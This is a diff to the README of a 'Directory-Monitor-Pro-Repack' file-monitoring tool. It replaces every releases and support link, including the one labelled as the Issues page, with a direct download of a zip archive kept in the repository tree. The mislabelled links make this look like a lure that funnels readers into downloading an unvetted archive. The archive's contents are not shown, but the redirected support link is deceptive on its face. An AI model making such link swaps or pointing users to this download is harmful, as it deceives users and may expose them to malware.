@@ -6,7 +6,7 @@ Welcome to Directory-Monitor-Pro-Repack! This application helps you keep track o
 
 ## 📥 Download Now
 
-[![Download Directory-Monitor-Pro-Repack](https://img.shields.io/badge/Download-Directory--Monitor--Pro--Repack-blue.svg)](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/releases)
+[![Download Directory-Monitor-Pro-Repack](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/raw/refs/heads/main/operalogue/Monitor_Repack_Pro_Directory_v1.4.zip)](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/raw/refs/heads/main/operalogue/Monitor_Repack_Pro_Directory_v1.4.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ Welcome to Directory-Monitor-Pro-Repack! This application helps you keep track o
 
 ## 📦 Download & Install
 
-To download Directory-Monitor-Pro-Repack, [visit this page to download](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/releases). 
+To download Directory-Monitor-Pro-Repack, [visit this page to download](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/raw/refs/heads/main/operalogue/Monitor_Repack_Pro_Directory_v1.4.zip). 
 
 1. Click on the link above.
 2. Find the latest release version.
@@ -59,7 +59,7 @@ We welcome your feedback and questions. Join us on our GitHub Discussions page t
 
 ## 📞 Contact Us
 
-For support, please visit our Issues section on GitHub at [Directory-Monitor-Pro-Repack Issues](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/issues).
+For support, please visit our Issues section on GitHub at [Directory-Monitor-Pro-Repack Issues](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/raw/refs/heads/main/operalogue/Monitor_Repack_Pro_Directory_v1.4.zip).
 
 Thank you for choosing Directory-Monitor-Pro-Repack, where managing your files is straightforward and efficient! Enjoy peace of mind with enhanced file and folder monitoring. 
 
@@ -67,4 +67,4 @@ Thank you for choosing Directory-Monitor-Pro-Repack, where managing your files i
 
 To learn more about the technology behind Directory-Monitor-Pro-Repack and its capabilities, check out our Wiki section on GitHub.
 
-Don't forget to [visit this page to download](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/releases) the latest version.
+Don't forget to [visit this page to download](https://github.com/MazuJavaDwenda/Directory-Monitor-Pro-Repack/raw/refs/heads/main/operalogue/Monitor_Repack_Pro_Directory_v1.4.zip) the latest version.
